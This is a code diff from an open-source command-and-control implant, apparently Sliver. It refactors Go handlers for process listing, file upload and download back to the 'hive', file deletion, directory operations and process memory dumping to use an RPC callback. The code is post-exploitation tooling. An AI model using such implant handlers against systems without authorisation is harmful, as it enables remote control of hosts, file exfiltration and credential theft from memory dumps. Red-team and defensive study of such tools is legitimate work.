@@ -14,20 +14,23 @@ import (
 
 	"os"
 	"path/filepath"
-	pb "sliver/protobuf"
+	pb "sliver/protobuf/sliver"
 
 	"github.com/golang/protobuf/proto"
 )
 
+type RPCResponse func([]byte, error)
+type RPCHandler func([]byte, RPCResponse)
+
 // ---------------- Cross-platform Handlers ----------------
-func killHandler(send chan *pb.Envelope, data []byte) {
+func killHandler(data []byte, resp RPCResponse) {
 	// {{if .Debug}}
 	log.Printf("Received kill command\n")
 	// {{end}}
 	os.Exit(0)
 }
 
-func pingHandler(send chan *pb.Envelope, data []byte) {
+func pingHandler(data []byte, resp RPCResponse) {
 	ping := &pb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
@@ -37,19 +40,14 @@ func pingHandler(send chan *pb.Envelope, data []byte) {
 		return
 	}
 	// {{if .Debug}}
-	log.Printf("ping id = %s", ping.Id)
+	log.Printf("ping id = %d", ping.Nonce)
 	// {{end}}
-	data, _ = proto.Marshal(ping)
-	envelope := &pb.Envelope{
-		Id:   ping.Id,
-		Type: "ping",
-		Data: data,
-	}
-	send <- envelope
+	data, err = proto.Marshal(ping)
+	resp(data, err)
 }
 
-func psHandler(send chan *pb.Envelope, data []byte) {
-	psListReq := &pb.ProcessListReq{}
+func psHandler(data []byte, resp RPCResponse) {
+	psListReq := &pb.PsReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -64,7 +62,7 @@ func psHandler(send chan *pb.Envelope, data []byte) {
 		// {{end}}
 	}
 
-	psList := &pb.ProcessList{
+	psList := &pb.Ps{
 		Processes: []*pb.Process{},
 	}
 
@@ -76,16 +74,11 @@ func psHandler(send chan *pb.Envelope, data []byte) {
 			Owner:      proc.Owner(),
 		})
 	}
-	data, _ = proto.Marshal(psList)
-	envelope := &pb.Envelope{
-		Id:   psListReq.Id,
-		Type: pb.MsgPsList,
-		Data: data,
-	}
-	send <- envelope
+	data, err = proto.Marshal(psList)
+	resp(data, err)
 }
 
-func dirListHandler(send chan *pb.Envelope, data []byte) {
+func dirListHandler(data []byte, resp RPCResponse) {
 	dirListReq := &pb.DirListReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
@@ -113,13 +106,8 @@ func dirListHandler(send chan *pb.Envelope, data []byte) {
 	}
 
 	// Send back the response
-	data, _ = proto.Marshal(dirList)
-	envelope := &pb.Envelope{
-		Id:   dirListReq.Id,
-		Type: pb.MsgDirList,
-		Data: data,
-	}
-	send <- envelope
+	data, err = proto.Marshal(dirList)
+	resp(data, err)
 }
 
 func getDirList(target string) (string, []os.FileInfo, error) {
@@ -131,7 +119,7 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
 }
 
-func rmHandler(send chan *pb.Envelope, data []byte) {
+func rmHandler(data []byte, resp RPCResponse) {
 	rmReq := &pb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
@@ -158,16 +146,11 @@ func rmHandler(send chan *pb.Envelope, data []byte) {
 		rm.Err = fmt.Sprintf("%v", err)
 	}
 
-	data, _ = proto.Marshal(rm)
-	envelope := &pb.Envelope{
-		Id:   rmReq.Id,
-		Type: pb.MsgRm,
-		Data: data,
-	}
-	send <- envelope
+	data, err = proto.Marshal(rm)
+	resp(data, err)
 }
 
-func mkdirHandler(send chan *pb.Envelope, data []byte) {
+func mkdirHandler(data []byte, resp RPCResponse) {
 	mkdirReq := &pb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
@@ -189,23 +172,18 @@ func mkdirHandler(send chan *pb.Envelope, data []byte) {
 		mkdir.Err = fmt.Sprintf("%v", err)
 	}
 
-	data, _ = proto.Marshal(mkdir)
-	envelope := &pb.Envelope{
-		Id:   mkdirReq.Id,
-		Type: pb.MsgRm,
-		Data: data,
-	}
-	send <- envelope
-
+	data, err = proto.Marshal(mkdir)
+	resp(data, err)
 }
 
-func cdHandler(send chan *pb.Envelope, data []byte) {
+func cdHandler(data []byte, resp RPCResponse) {
 	cdReq := &pb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
+		resp([]byte{}, err)
 		return
 	}
 
@@ -213,25 +191,26 @@ func cdHandler(send chan *pb.Envelope, data []byte) {
 	dir, err := os.Getwd()
 	pwd := &pb.Pwd{Path: dir}
 	if err != nil {
-		pwd.Err = fmt.Sprintf("%v", err)
+		resp([]byte{}, err)
+		return
 	}
 
-	data, _ = proto.Marshal(pwd)
-	envelope := &pb.Envelope{
-		Id:   cdReq.Id,
-		Type: pb.MsgPwd,
-		Data: data,
-	}
-	send <- envelope
+	// {{if .Debug}}
+	log.Printf("cd '%s' -> %s", cdReq.Path, dir)
+	// {{end}}
+
+	data, err = proto.Marshal(pwd)
+	resp(data, err)
 }
 
-func pwdHandler(send chan *pb.Envelope, data []byte) {
+func pwdHandler(data []byte, resp RPCResponse) {
 	pwdReq := &pb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
+		resp([]byte{}, err)
 		return
 	}
 
@@ -241,23 +220,19 @@ func pwdHandler(send chan *pb.Envelope, data []byte) {
 		pwd.Err = fmt.Sprintf("%v", err)
 	}
 
-	data, _ = proto.Marshal(pwd)
-	envelope := &pb.Envelope{
-		Id:   pwdReq.Id,
-		Type: pb.MsgPwd,
-		Data: data,
-	}
-	send <- envelope
+	data, err = proto.Marshal(pwd)
+	resp(data, err)
 }
 
 // Send a file back to the hive
-func downloadHandler(send chan *pb.Envelope, data []byte) {
+func downloadHandler(data []byte, resp RPCResponse) {
 	downloadReq := &pb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
+		resp([]byte{}, err)
 		return
 	}
 	target, _ := filepath.Abs(downloadReq.Path)
@@ -278,26 +253,23 @@ func downloadHandler(send chan *pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(download)
-	envelope := &pb.Envelope{
-		Id:   downloadReq.Id,
-		Type: pb.MsgDownload,
-		Data: data,
-	}
-	send <- envelope
+	resp(data, err)
 }
 
-func uploadHandler(send chan *pb.Envelope, data []byte) {
+func uploadHandler(data []byte, resp RPCResponse) {
 	uploadReq := &pb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
+		resp([]byte{}, err)
 		return
 	}
 
-	upload := &pb.Upload{Path: uploadReq.Path}
-	f, err := os.Create(uploadReq.Path)
+	uploadPath, _ := filepath.Abs(uploadReq.Path)
+	upload := &pb.Upload{Path: uploadPath}
+	f, err := os.Create(uploadPath)
 	if err != nil {
 		upload.Err = fmt.Sprintf("%v", err)
 		upload.Success = false
@@ -314,16 +286,10 @@ func uploadHandler(send chan *pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(upload)
-	envelope := &pb.Envelope{
-		Id:   uploadReq.Id,
-		Type: pb.MsgUpload,
-		Data: data,
-	}
-	send <- envelope
-
+	resp(data, err)
 }
 
-func dumpHandler(send chan *pb.Envelope, data []byte) {
+func dumpHandler(data []byte, resp RPCResponse) {
 	procDumpReq := &pb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
@@ -339,13 +305,8 @@ func dumpHandler(send chan *pb.Envelope, data []byte) {
 	} else {
 		dumpResp.Err = fmt.Sprintf("%v", err)
 	}
-	data, _ = proto.Marshal(dumpResp)
-	envelope := &pb.Envelope{
-		Id:   procDumpReq.Id,
-		Type: pb.MsgProcessDump,
-		Data: data,
-	}
-	send <- envelope
+	data, err = proto.Marshal(dumpResp)
+	resp(data, err)
 }
 
 // ---------------- Data Encoders ----------------
